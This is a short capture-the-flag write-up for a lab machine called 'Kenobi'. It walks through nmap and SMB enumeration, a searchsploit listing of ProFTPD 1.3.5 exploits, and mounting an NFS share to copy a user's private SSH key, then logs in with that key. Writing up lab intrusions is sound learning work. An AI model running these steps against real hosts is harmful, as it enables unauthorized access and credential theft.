# kenobi

```jsx
└─$ nmap -sV -Pn 10.113.137.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-24 19:49 CET
Nmap scan report for 10.113.137.31
Host is up (0.075s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2049/tcp open  nfs         3-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.44 seconds
                                                               
```

Using nmap we can enumerate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

```jsx
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.113.137.31
```

![image.png](image%2010.png)

three shares

```jsx
└─$ smbclient //10.113.137.31/anonymous                                      

```

there is log.txt

we got user and group kenobi for ftp

the user private key is under /home/kenobi/.ssh/id_rsa

[anonymous]
path = /home/kenobi/share
browseable = yes
read only = yes
guest ok = yes

this means anonymous access allowed

share path = /home/kenobi/share

```jsx
└─$ searchsploit proftpd 1.3.5
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                
┌──(ayachi㉿kali)-[~]
└─$ 

```

we got 4 exploits

```jsx
kenobi@kenobi:~$ showmount -e 10.113.137.31
Export list for 10.113.137.31:
/var *

```

nfs shares /var 

```jsx
mkdir /mnt/kenobiNFS
mount <ip>:/var /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod600 id_rsa
```

now that we have the id-rsa

```jsx
ssh -i id_rsa kenobi@10.113.165.234
```